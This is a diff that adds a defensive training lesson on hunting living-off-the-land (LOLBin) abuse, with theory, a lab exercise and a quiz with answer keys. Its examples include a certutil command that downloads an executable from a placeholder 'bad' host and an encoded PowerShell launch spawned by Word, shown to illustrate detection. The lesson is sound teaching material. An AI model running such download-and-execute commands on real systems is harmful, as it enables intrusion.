@@ -736,3 +736,100 @@ lessons:
         options: [Normal backups, Lateral movement worth urgent investigation, A DNS change, A patch install]
         answer: 1
         explanation: One host suddenly reaching many others over remote channels is classic lateral movement.
+  - slug: hunt-lolbins
+    title: Hunting Living-off-the-Land Techniques
+    order: 9
+    difficulty: intermediate
+    summary: Hunt attackers who abuse built-in, trusted system tools (LOLBins) to blend in, by focusing on anomalous usage and context rather than the presence of the tool itself.
+    theory_minutes: 12
+    lab_minutes: 54
+    objectives: ["cysa:1.4", "cysa:3.1", "sc200:2"]
+    learning_objectives:
+      - Explain living-off-the-land and why it evades simple detection
+      - Identify commonly abused built-in tools and how attackers use them
+      - Hunt for anomalous usage of trusted binaries by context, not presence
+    theory: |
+      Sophisticated attackers increasingly avoid bringing their own malware and instead **live off the land**,
+      abusing the legitimate, signed, built-in tools already on the system (**LOLBins** on Windows, standard
+      utilities on Linux). PowerShell, `certutil`, `rundll32`, `wmic`, `bitsadmin`, `curl`, `ssh` and the
+      scripting hosts are all normal administrative tools, which is exactly why attackers use them: they are
+      trusted, present everywhere, and often excluded from suspicion. This defeats detection that looks for
+      unknown or malicious files, because nothing unknown ever touches the disk, the attack is built entirely
+      from tools the defender's own OS provides.
+
+      Because the tools themselves are legitimate, hunting LOLBins means shifting from "is this binary bad"
+      to "is this *usage* anomalous". The same `certutil` that an admin uses to manage certificates is
+      suspicious when it downloads a file from the internet; `rundll32` is normal, but not spawned by Word
+      with an odd export; PowerShell is everywhere, but encoded commands, downloads from memory, and
+      execution spawned by an Office document are the tells. The hunt focuses on **context**: the parent
+      process, the command-line arguments, the user, and whether this tool is normally used this way on this
+      host. A LOLBin invoked by a document, with network activity, in a way its administrators never use, is
+      the signal.
+
+      This is where behavioural baselining and the MITRE ATT&CK catalogue pay off, ATT&CK documents the
+      LOLBin techniques, and knowing your environment's normal admin patterns lets you spot the abuse against
+      them. The hunter's discipline is to hunt for the suspicious **pattern** (the download-and-execute, the
+      Office-spawned shell, the encoded command) rather than banning the tool, because these tools are needed
+      for legitimate work and cannot simply be removed. Catching living-off-the-land is one of the clearest
+      examples of why modern detection is behavioural: the artefact is a trusted tool, so only its anomalous
+      use reveals the attacker.
+    examples:
+      - title: Same tool, benign versus abused
+        body: |
+          certutil -dump cert.cer          -> admin managing certificates (normal)
+          certutil -urlcache -f http://bad/x.exe x.exe -> downloading a payload (abuse)
+          The binary is identical; the usage and context are the signal.
+      - title: Context that flags a LOLBin
+        body: |
+          parent: WINWORD.EXE  ->  child: powershell.exe -enc <base64>
+          An Office document spawning an encoded PowerShell command
+          Normal admin never does this -> hunt the pattern, not the tool.
+    exercise:
+      title: Hunt a data set for living-off-the-land abuse
+      environment: Sample endpoint/process logs (provided or lab-generated) with benign admin activity and some LOLBin abuse
+      tools: [A SIEM or notebook, sample process-creation logs, a LOLBin/ATT&CK reference, a notes file]
+      steps:
+        - Explain why living-off-the-land defeats detection that looks for unknown or malicious files.
+        - List several commonly abused built-in tools and one abuse technique for each.
+        - Hunt the process logs for a trusted tool used in an anomalous way (download, encoded command, odd parent) and describe what you found.
+        - For one finding, show the context (parent process, command line, user) that makes it suspicious rather than the tool itself.
+        - Explain why banning the tool is not a viable response and what you would detect instead.
+        - Map your findings to ATT&CK techniques and note the normal admin baseline you compared against.
+      deliverable: A hunt write-up explaining the LOLBin problem, listing abused tools, one anomalous-usage finding with its damning context, why banning the tool is not viable, and the ATT&CK mapping.
+    expected_outcome: >
+      You can explain living-off-the-land, recognise the built-in tools attackers abuse, and hunt for
+      anomalous usage by context, parent process, command line and baseline, rather than the mere presence
+      of a trusted binary.
+    quiz:
+      - prompt: Living-off-the-land evades simple detection because
+        options:
+          - It uses custom malware
+          - It abuses legitimate, trusted built-in tools, so nothing unknown touches the disk
+          - It only works offline
+          - It needs admin rights always
+        answer: 1
+        explanation: Using signed, built-in tools means file-based detection finds nothing unknown to flag.
+      - prompt: To hunt LOLBins, you should focus on
+        options:
+          - Whether the binary exists
+          - Whether the usage is anomalous, by parent process, arguments, user and baseline
+          - The file size only
+          - The time of day only
+        answer: 1
+        explanation: The tools are legitimate, so anomalous usage and context, not presence, reveal the attack.
+      - prompt: certutil downloading a file from the internet is suspicious because
+        options:
+          - certutil cannot download
+          - That is an abuse of a certificate tool to fetch a payload, unlike its normal use
+          - It is always malicious software
+          - It deletes logs
+        answer: 1
+        explanation: Using a certificate utility to download files is a classic LOLBin technique distinct from its legitimate purpose.
+      - prompt: Why is banning an abused built-in tool usually not viable?
+        options:
+          - It is impossible technically
+          - The tools are needed for legitimate administration, so you detect the abusive pattern instead
+          - It would speed up the system
+          - It has no effect on attackers
+        answer: 1
+        explanation: These tools serve real admin needs, so detection targets the suspicious usage pattern rather than removing the tool.
